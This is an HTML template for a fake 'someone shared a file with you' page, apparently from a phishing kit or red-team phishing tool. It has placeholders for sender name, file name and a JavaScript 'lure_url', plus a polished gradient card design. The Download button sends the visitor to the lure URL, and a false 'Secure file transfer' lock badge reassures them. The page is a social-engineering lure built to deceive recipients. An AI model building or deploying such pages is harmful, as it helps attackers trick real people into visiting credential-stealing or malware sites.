<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>{from_name} shared "{filename}" with you</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 48px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: slideUp 0.5s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .file-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            box-shadow: 0 8px 24px rgba(102, 126, 234, 0.4);
        }
        
        .sender-name {
            font-size: 24px;
            font-weight: 700;
            color: #2d3748;
            margin-bottom: 8px;
        }
        
        .share-message {
            font-size: 16px;
            color: #718096;
            margin-bottom: 32px;
        }
        
        .file-info {
            background: #f7fafc;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 32px;
            border: 2px solid #e2e8f0;
        }
        
        .file-label {
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #a0aec0;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .file-name {
            font-size: 18px;
            font-weight: 600;
            color: #2d3748;
            word-break: break-word;
        }
        
        .download-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
        }
        
        .download-btn:active {
            transform: translateY(0);
        }
        
        .download-icon {
            font-size: 20px;
        }
        
        .security-note {
            margin-top: 24px;
            font-size: 12px;
            color: #a0aec0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
            }
            
            .sender-name {
                font-size: 20px;
            }
            
            .file-name {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="file-icon">ðŸ“„</div>
        
        <h1 class="sender-name">{from_name}</h1>
        <p class="share-message">has shared a file with you</p>
        
        <div class="file-info">
            <div class="file-label">File Name</div>
            <div class="file-name">{filename}</div>
        </div>
        
        <button class="download-btn" onclick="clickedDownload()">
            <span class="download-icon">â¬‡</span>
            <span>Download File</span>
        </button>
        
        <div class="security-note">
            <span>ðŸ”’</span>
            <span>Secure file transfer</span>
        </div>
    </div>

    <script>
        function clickedDownload() {
            window.location.assign({lure_url_js});
        }
    </script>
</body>
</html>
